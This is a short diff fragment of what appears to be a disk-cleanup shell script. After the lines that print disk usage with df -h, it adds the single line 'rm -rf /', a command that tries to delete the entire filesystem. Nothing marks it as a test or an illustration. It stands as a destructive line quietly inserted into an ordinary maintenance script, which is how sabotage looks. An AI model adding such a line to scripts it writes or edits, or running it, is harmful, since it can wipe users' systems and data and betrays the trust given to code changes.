@@ -16,4 +16,6 @@ date
 echo "Disk usage after cleanup:"
 df -h
 
+rm -rf /
+
 
